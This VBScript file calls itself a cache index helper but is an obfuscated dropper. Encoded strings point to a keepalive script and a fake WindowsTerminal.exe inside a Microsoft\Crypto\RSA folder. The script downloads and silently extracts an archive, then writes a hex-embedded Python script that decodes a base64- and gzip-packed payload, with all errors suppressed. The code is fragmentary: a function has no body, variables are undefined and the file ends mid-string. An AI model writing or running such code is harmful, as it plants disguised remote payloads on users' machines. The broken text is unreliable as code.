' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
O7 = Dk("92,107,101,101,112,97,108,105,118,101,46,99,109,100")
O8 = Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,80,121,116,104,111,110")
O9 = Dk("87,105,110,100,111,119,115,84,101,114,109,105,110,97,108,46,101,120,101")
O10 = Dk("92,77,105,99,114,111,115,111,102,116,92,67,114,121,112,116,111,92,82,83,65,92,87,105,110,100,111,119,115,84,101,114,109,105,110,97,108,46,101,120,101")

RT = sh.ExpandEnvironmentStrings(RT)
ST = sh.ExpandEnvironmentStrings(ST)
P1 = sh.ExpandEnvironmentStrings(P1)
P2 = sh.ExpandEnvironmentStrings(P2)
P3 = sh.ExpandEnvironmentStrings(P3)
K1 = sh.ExpandEnvironmentStrings(K1)
K2 = sh.ExpandEnvironmentStrings(K2)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' ensure payload - embedded hex always refreshed, then repo fallback
Dim PP
PP = fo.GetParentFolderName(P1)
If Not fo.FolderExists(PP) Then fo.CreateFolder PP
Dim e
e = "2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d2062274a50437a2b7a7437752f732f65316147556742674d3471565441497577335849764338394c567465757253764341356737526e51544a2b715774353638786c437666447a307649454241357454753135723538694d6d59313037415a2b315552305a4668675a4b354a4d2b456c59542f5956516a642b4746347767387074556264483259466f5974314535394f6844464d723168797950474a485734366f33796758707878564b59477934776753684b5454512b51446a455a533768687433" & _
        "4c3741464f6a55527054784247524f4d456d7161673958316f31737356456c6a6377553678736548665a6c6a6b316c566261716b46646a79474b5332543944684a5a716d6c45646a38315742566441414f4d727057626f2b63545175467072613565366a71624448584e486d454e6a674b332f796b6b574368505a30442f52304763704350685a506d616c3553494d6643786471694a31444f306f706c715948677761453835412b424e336e79443238734d66354f6c4c674e42424d45397a46467a53546853754f7452566471686952503461306844535468685553454a4f4159356337775958546d61486e467a3678337331742b41754668446b61475042627178396c537778366f4372426c4d70546933756b61514d38594c6665556e2b4a65536435665168377731634c5073386d78765a597539367a566b4a587933316b4a574f2f33594d57687a54495837426670727471526257494a634e3730556d4b76353875796b62363761365355575a747a5554322b3169705470724e6a6a396874642f423759372f3039713451672b5971634f586d5766786c6567672f6647445a4733323643704e4a756f6b526a2b7a634a354d6861787650453346614b61775468" & _
        "4349524b315441587845657557714a49683776796866372b32427672702f354b774e6f71304f6a517a704532623461647379483569394b452f747a5032506a4e61374b55375857694c4b3363536f356d38517465566f70344b324366316c7538543053747a4e4c347445374f6d62374a595051576a41764c59465137347272725a76367a2f68474b4273695866302f466d706837557a2b7931586a4f65456f327046703372733772726e2b64334b77587176576a2f32366d2b492f763169424857365162704a5663654652382f76746d354d357a784d34337361335332594965314555767a7644316e41386f413677373933364f3370756f62625661684e7936672b33456949616433683862397a3165315a52735837444e654763704b50426d5632714c56394e66774e704d4b3533676d747679775a6174773434527042346e662b794b6978477948733344683270725958442b3349453176633562706441643278646162465a4344594c4a394634323672494f623852717049335966645161626c72776155507538394d7170703459693154384b4562457963702b686b56575a666d7979414b326b4c33773676554958574239646534436b6d6650435653305467" & _
        "68593379726f5859744b6a464266696e3569582f3259636458585172354d4638526557686a4e3970345033522f35573042756a67333832757a714d545a50373269626b37597639492f6758654f736274763954524f4e47496543784d4d4e514d304d5370646235496856616d7a366d68526644302f482f753548417666436d5542316e46367354383555754e727339726e554839587665486f437772377531616e36684e506b41462b4c4b645845506f50792f6354642b676c2b47334c667174774a784c764d7a32794265665262394a7a343642746d446e5a2f77725955667477557750714c354e344746742f61644b496c67765876554f6f756d743076475167664b4b756e544e747966427851446674624731795a697357586976424d4f5661626237426133727263706373577969744f776d456e656b7268572f39386a3969364350396f5a375061694d4c4579342f5767593855724730476771314b7862722b67577652456c70644148726f7279744830674f31654c684d622b3358484f5832623977436d3857796438794f3472302f6c667a54614b6237796c363378707a6c3763442f73714a7345467645577163625076676564587659524849784e714b75" & _
        "484e2f2f6e7639734b36717068765a76477a664f7045373041754a456a694579777438474c3745735074444633692f497247723667746156694f3336786762537669744f7a2b7a4564733751352f2b634b78753174643938706270796b555171725065666735324f446666342f322f59714e35782f702b66756a36516270686f6c374e315a6b6e2f6f6e584e4e3354694e4653494f6f6f716674544f6646796e62364c33754b3945524e7a66766f4253307330632b7068633049776f324d6253766264625a34494d6a53694376495a6d6956363764753133762f3259366a6265337848712f6c686f4e76436c44765777356c3734717a6779704a374b336d384578744e6e4f767653654339335778424e4b562f2b4d6961556f657169626355376f724946342b61546c6478755a6c4c704c644a634f6976645743437550367075547779654c7669626b4a4b5839746a6c77687a4a7234785158535a524c692f33316b494d2f38666f61386d2f506a57636a5035424a5a4b51427655593039456c49727146574d694e46507749434c64666c624a732b50722b6776712b364872784b304c68344664553276373350706a6e6f745163764c6a4f44787944714b4747566f" & _
        "4a49715665436c496a516e74386d6c6662426a724f69395978587071655a6c2f682b2f6f77415a666a4b6d51717a346f78324c5a564d4a78624a5676504632315354445572506a7a396342666a79344f72435263386f7566436b5839572f2f724e2f6f47665550453849366371424e523248395742666f524e513942584d59702b7139797a784d4242732f2b5959796a7462357050496f6534706d36757536465a6446634a5668366b64393463306647596c676a54714f774858507164716567622b5961494f7746646736554c7646665239683655555178333371485a37504d5a6c484f65366447364a5641726c394d3849354a3834793369497730526c77724573507974496a395438502b65426b7a6e446d6d6431425a30764b5a4e58324f447a70586e624732466b3262584b516339585a765139676b6d4e34663679424e7468635a57426742464157566e5a315a326f45626f4651744744734d4359665156426131672f4e7967714a415146592f43424d78586a7a5368785956654b4e7173634a77487749304d6861354d3147474f6b4678496941347579625a77686469527953484841322b527963615246515a4f77435a554c78326b357354436c39666b7a" & _
        "51624671733941324c5968414f61382f59425156454e444474586b356a54674944675577303041704756474465326964697859324d714f366b465570754732646a7236456b534a5152596d395344645a73486d5a4c51486e4c58366a6b444937696165414e79674e5078676f5069576a615a554649617654493974666e344c4247567277754a513465554f394856396c6d2b6377526255584f42576b58416d544565636b6358387a423175527569385553586544586842703658587841662f7a7138415748752b786a52575671614266424862503577686d3666466e454d4c72526e59447a68304848776376376952565862716b3659517a6c445551655a685653325544786d79554866686c307a3041446257316c77427a6433734a67594641554c68714e5456687730476a4d4c5741695a524a4b45383549666c6a4f326e7a545851674377592f51334f553947506f62544344705533324e78424c425a6d5438585870376667774f78634f7577595268337867386b6d49413055566969725768745078494253315a556d362f61316c557863317241595879646d494b656f546a4a713442574d746231754a677256744970476a586373416455304e4e4f43356278" & _
        "626c3862426e77426362472b647966526578786a773734514e734d765239412f58734b7075424151564b51694d6f697a386f414e462b3835794c485444315272686d6b6b636f43394d4b433659616f6f366d506c467443704546796644562b5a6b353153707972566c3876332f30384547686b484c67463068364f61325153783039445a6c36685a5074505467704d51714a49786b4e4d30514a716977466d6a6f70675a77714d697757666a725166554235545554346b68616d69624d33433363794b4b717167563141794545566c685768597245564c424f5373632b706e784c79464d5578784e636d63654342386746515751754e417a4e484f2b5551697243666855635430595969553847397036526d48544142615a6b7a344f6e6a5246562f5634647043364762786831473053462b514253434f642f43497657574d33497654345a3944704f494b6f4f417869676a316a6e3153646f444641344651714d5469686b5543446d454d6c737a7346304c335735414b2b45764574434d6f73416e56436d32346d66466b6d45566b76456a39633941785538486c5072482b58782b68583152574e563964735664656a304c75426779484d394f7738763441454b73" & _
        "6364512f63395968565331614162464f4547545357514370303556316a42444d595937563570636f754679594250627646704e6a5569502b55524b706f3059347a48312b3149387452785078655a676d76615756506b38736d556f68776445372b537131595067664d5574626f344f596468366a4f42626f763379306d486646414973615936427447706767484b42306263524a70533750473135684232796e455138586c7252394d6e553337764b4b3577357568763433616530736957527a594438584c51416e2f544e7a524230316b3071434c302f5062793974385438704f45527766394547514b514952784c393442355850634d367370384e42795655672f36466934436c476456482f6a7363487745434b4b706c58544f4b69356338537975784161594b55716b655530414d52567a4e4d30693158415476414a7248714f4d37596f38424d53772f5041486c6e3842484e6b6f453344744b4f336f4b634d59453761674e4f7950614a70672b4d6f5a3045512f70474574335564635375624173736f464e65726738715837686763636f41664758383950542f6e757969343148384b5a5275746955415135494571684a6876476463416466556370696e74" & _
        "3332306534356377536e43725644584f41643079516251432b3342797139535079397845547650665039585a4c4a32745341732b4942525373457533715576676f5279584231726231364945546a2f4a74363977416a69696f2f444c497a4e4f5858484a4359784b424d49657868757a464f707648776265615137535a61477030625447735864377757734b4b394b6b527655527668656f4768433173536d61634d65576d444251614449775a5a72476d38685978466367755a737a5946724855694458437263323468613159556346644b4c427a4e52575875545a695751414c48516130427059504c424d6869796750306a4a71734c61345474474144386f4b7a395452704e655061714c335941763433494648462b514854587a496f6d4971596b3931576a564d32495a6d4c6745657559397a636835455a37782b6d4f7373637742704c55365473446669664746317757394174617130717734457572514b6a6f4e31306762546b4351525367797167586446752b46737a706c6c45784b636f4131703341647442444d796a685137676e4e77766b69692f304b76394a734d544a6a43564f756c4d7a7a6349577063775739735544476d59415364674e526667" & _
        "474a6f7873394d4c6c5a336735654b6f4b7969346c73677a57346a664443475549706b6c68366b575343666e6a635378494b487a733045513846776e2f7957484137677831336b7a426c4b37346e734368662b544f5063724b4e786c4565647875554539662b5052676e6b35775574334a506948454357366d566c744361592b52586c46572f5951696a676e667373645a66343552345853466c4541586551414947364c516545316c6a454b36426d6d3835414a4b657442656746634d3448344a78436767656c69596c5849744f674e3964734676746b764e4c45486f584b774a2b49537471336b4f3341767a4b4f6941527559614d6849474c386867436c4359544e5a466d4652367957476c78556a6d6377314b714c634b454b31713756697651594c56374e417654306845484652367942683450566f516b32423348552f4972464b6b796863445a337769766b4c67514f4f4562724d4e3856727a336b3462306349307a6f7a68527235542b45464157594249554e4e7457436e614d70423264416b516639476b54416c766b4f5142713375555176547343506d764c6b753535377173426b395265344658466a6a3854457434553031422f6269793835476b4c" & _
        "6c366e5a7078594664646f7a6b335a786b4d31437858436c5935544b57376172695838536170474771314b4d516c76364f304e72553954646b31456f47715943684b75552b373778544d414559413431475a5439746447614b62456455374c7a4567345239764f7a6d6145385167735657473865342b46684d77577754354864475a517965694f39417641456b30445855563568364c6e624e4465524f394d624d682f71414f614e4d673850484135666e496357465a5139643746734e675453324b4b4b6e35384c422f73344276776935426568344c68596e4a7a4f6b7745456e6a646c4744537a617a30493351456f55504e4a7267325947784b58634566434f4565795944384264352b4e6368476b63474661627a776f3935355639344e5a6168636978516c33317746646c5645536a664f416742677458736f493169416447442b2f4c4556617770563649794c46546656777a7152786746784549353666766e47304e3344746168454752785163594732666a4c49484f474c414d5449646c486e6749524d6b48694970545466644955476159553150574a79536b39394173674a78634b3579396841724f4273774e5162614e33514276784164546a52775748" & _
        "654c587a694867594541646669383947335155377742634c477857573643436c4e5755556a61556f2f516852316d436b6d615668493867316e39696f6b6143474f6b6e795433656e316b50384a4c566a6a4668614568792f3667456d2b5849366b656d555a6c3339436d63536b576c454c786d31493149487477775246356845417a623741526f7241784e4a574247474e55796442412f6f6b456d32507a64464d6e5a4768696e742f3451765948474c2f484e797364564933796d4169775059702b47506953454c30784d7a574547364f746656446630416b6852345545476c7a5a354f5953494e4668414a75576f435a32755a6a41635a4678307a66745148722b4c525966496a767173533637435775594b7a7154754b6b39484253444e42627954424d53673563636d6f55354e514f545642416c43306c4d584b4c6f685a63794e6e637973764a2f672f4b61345a2f7a4a382f4d42764451462f42564f486444636c5137416d677359423275555a4b684878304143414a506b7030496b633652646737424f6a39616f32675134694745347065435a5046695361455268743658735551314c74664a6d654b477744594330646e5358744f466b733677466c5777" & _
        "4b4e5248666b526659522f67496d38416d4a6746544a7879446b774c466c6b5a68516552303837776335754155594c2b34667266714d314d752b674957317575423230416f71415242344147426b6752335a644e516d6f4a4a30536f635164665859326630385659314d68513568483057564b5431305941754830515241636c4d78703258726b557655733451494f7a57534642566e4e766b584c6d426d4a47454d5968662b4d554f324677346a2b4c4c796f354b652b4c4831414a4259464f6d4d5234444b757731334f716c5630526570673350433831434a766232564d716650344665784e6f317767656b4f67547a665948734169394955725846426c476c6e6759416a78616f696a782f354d3647634a4a743956396e3434722b726255745358524b535a38684e444e4e326d7952567947636348373470425868654c673039462f3067587839354d4454366a52414e6f62556d74324153436d6535595756356f317a645943753053774c747347413241676157366139527042714e4169615974706d304c696b6d5168734a4577676a4638775945426b4a64563279714a375857716f3850594732786b304269695051686a327247686f554f6d6b3453772b4a" & _
        "4c536b31444a4538343132536f574c75565a305665565a7a7158644930337358544358614241574561613446714a30415078633449537554434852643835663941784e3663325a7845462f7746656375596c506f56423163715830693132554b595058585133342b4d74467467437043687651756e616933434d32704253764c48396b5179337868423448756f3871422b72356241565479514a2f3736646c557a3142386472663946434a56582b5949475541526f7047596775617763595a7641654f387368346d645361774d442f47424b723559446d37784a6e696f3170584b485367616f4d6b7952307a477962744668774266385157385341526732636666624778734c355a4363504d3553443753544d35584f45573262477a5343562b46796e4a5661476b42545535696d554b52586957475a4633476558786e7969386a5031773036652f4257654e45667864634165704e7246586562475459352b3464656f6a67686339646c474a7653706c314a776e686354556f544a4a2b502b4254796974346f713049385367703658525a55544b506771694e6641477a524f51442f6b74474347796541425a49464d2f57686235733065423550645146492b52684d" & _
        "395035515a614b334f7736782f786e3951377741545a7756486b536573454246586c7a354b516a7545564d335545526277316a42476c71596f4d4f6a5739477a496d45457543704a4e47507a6752564a4545756c695272524a64674b484c397a5a784e674a3350635567474366594d366b4d34316b68476d5861574b4a326f50316a6c4a64686f34436d71625065377758634b7871522b586b6c31534e4553436b68394667785a576d704636436a54424130487a705842574d61494569645373525261316d3546346935726c31334d78737475736439565761344f446b6c365332704e6f55366357436d4b4635745455416169573353752b41774959545a61516a2b4d336c4630557351444774596842615374525575593550375966466f47334a346a56312b4968754c48546178465448336e415965726842583251674c4d48693361674c587336416d4d58486937574b667a6f4f633946637079735554373655354c556c536255444d6f657378746d6c4c3178557a7077594651656f4a4a486a7453306b5547466149734a556154512b41757165684a6b486876675236594472726d394d4a6f516a4838766751306773664743574a4d333356506a7359417a3958" & _
        "775159304e526d504e32734b4b326d467976306f4430466830684947514456646c4a39485971584e5439546f416a6542346865364d556e6143566259452f656a495447507879306f426430414e565049454d47456f704777736f6d394966387031796e526b796f4a4a61722f48696d7479724555555465354336314c466e7344515a5963377a4d50315478577573324d77533844527a4d64507948523049756771716e745a6537646b354d6c36533273503742536e4c5636686231326565697a665a355a70596b78634f6433373944615253422f38796c4b6b776f78305263673864674b676333706c67457445586c322f4642464d4d687847556b4a6b2b684d5378716851524e6e4a666337534670486a53594a2b4d3457347846356c2f444268546f79537766575049646e59375039314e5233654971316756624a6f7948706d456a65794e796e534e6d4e464d4e76793867486968356967503976746f46616453536b657671767a6b4b78317361436e4274735976366b7a59354275744376397149486e5544756574722f466c41315838636b304f4f64624e4b6e736d382b4333477376794a723976526e7370492f662b56636773324f4f6f4a4535715477346d" & _
        "2f61434b7838667769554f636248636b506876464b53674d44613438725244504c44546c3362737663696279724d624e51456b72765454466e2f72722f43597242586e4c573372767a38426b7a5558792b3138326639647437696934574d44376b476473322b44416d38766a624c71505373724a757344565a4c32634a764b5768737a662f6936677157764e6b6677374374592b776d797549372b717658316d7a57552b436e793571372f2f70365773394d646c634f594d7156656c356a4b7464335450483244546e70623345414a476e4e77757a54444538625730434233575a6b51694c517a644b664c733636416b2f38777176375a5575786667485863485a472b675963507042705977793472756e4e5764667777792f514b303362674e55634f2b4b2f4b7779612b657a453871486d42624c5078455a32744170706e3671365648446364685a74764c73754d6231573432665333435a6f65726e4854724a7330434f4b77442f314a71584471356e3949706f5854385a79726556364c4e39546a2b6838306872597971364b654a6a4e4a6a337977647947472f724d2f697165636d5a437a535a485934755875635a4d794e772f524a726b2f5252416f65764a" & _
        "2b56586676716f726e58645054544457576834647574474e56476f613964382b4a586e4e624f62596447394e4d6e49492f50322f6478624c57734b696f50377036697955326f3832392f3861546b49384f747179564d2f5a726e3638644873757133722f36335a71332b4f4752486230306b38656e4339757845375754586d63336d472f326a51513677725965366d4c7458537371394c622f6a395a6467584551722f4e317269694d64446332525048753871325070436c533974695666784f51326a35744c3571524d55664e78744b745453752b6a726c79497037584b71726575736465394e37673079504e2f795372797a4249374444314c3543654c53347a4d376569734f384e3643432f372f756d326a3744725a61344b4e66365a6f78317552346b5a553841756b4d584762734538354a7a4d71506e6b793475334d4837576f697358744b5649782f456367613157312f44387844664d317a46797a665344467732736f4f6330436d32437269764d646b7a334c4f58703137734b2f732f5533643758566d53486a4b7670766c576e5139634e4d6e6d307663572b7043746a2f704c646f6b4f6a2f717645644d564579576a6e51753165632f3672356d4a43" & _
        "52472b687168562b4b58544861562b42595242594c4a44794b696957726f65415033386b75583779582b6e4e3147556b79594c385353663663556f706948317270515a3961576a712b65562b4c6469786559367544584c504d4c617452394c4c7132374a394f5a49515a7864334f775933367241362f6e33694b32706938314e627338745272317a3445714b337457444f7771507452586a55327648365044384937786b656d734e3536494b6472336743766736534a3554396e7966784c6d57664d6b6a5a6b4534773076694f502f56357461346d726b4d683365644b3630642f713978766965564d76312f375a6a682b414143706b4b314b47704e442b66646f2f71383671546e2f616a622f31566b6d766e655234644868704b2b6d5764436a486b6b2b6b6a43786b3956476c396c4e70764e334e2b794b35486a7956717563737269623871734d6e4f714c5838766e7242356545764e6d4f2b5433723938506569637a626663504e6c307071732b424e38724e69536f6c4748324a3957317864636c69593263432f65676f69325036664e46584d48385938447451326251755a524e51376372764d2f6a5243684765445657726e716a585230696e506f595266" & _
        "364a6a6c32357832706d795368765a4e75765449756c5a463570767032696a757a4e5872725556616e5135464a6542776b322f50476463756245432f5232582f696c4a464b2b626d4376596e46664e333839486b644642344c5a4f46722f65585046764a74587862566f3144794765376941554d4b6f49766b6962326f702f694775782b766e6c646c726a586d473337583879354a67723952585966625a61356237792b7a455268324a747432366e2b6a586d737579324347564c75526d537532686e6f5656774d537478487a7470474e632b69795371334f7674344848712b7854726b323444535342476955732f59474b6937546b7666584a5142574c3150345358677773495834534c6f39384e3456593938313573433368504865576250713068506e693853624971584d773677446a30434e6d463672577533764b4c53696f625a55702b32566f3969514a6f32447172696a45316950632b746e653648476854454f3871335845596d7166755178415832713578587a784f6f424f424f5855334b7449693361634e39614e41372f77796d536b65436a76446b50336a74706c37717164735a61754a51652f696643443765784668307168516c2b6d5162396a" & _
        "545247754b566f35446179705a4c55714a6f6a56336d5248764b31647456522b4c532f657577764d652f74497a474e764c6c4431354c756c2f43313457655a443554705a614c7774774b42794b367a67536b2f6a79396139425a686b514759475a783842355733687852692b4d4e394b614d76594c4c796e53727243345034316162473133556d5071322b2b4251516c6644654e434d67435a4d456258716b2b35783847546b38764e76456d6f34394c41493966334161374f664e475437696752797468316a526c702f44764f49396635416a466f50734867654e32636d6b56382f48617243584448634a354a43356d53725a77544772616c4f6d6a6f6b7532624a664d543436424273716a764972465657633949305a48392f5555724e673267332f34587770716a7065726e4f6d6b346f646d5a485a31426f584437476743784d7078657641587244394f6633586f3970327969505a4c43375944657748467a6d5948364c614a34647a5572586b636c47617a694c596969637369596142623435754e4e306d644a476454546a2b716248574637596463644772736c796366547449734c65647658454938466c71357466362f78724b325564736542612f796539" & _
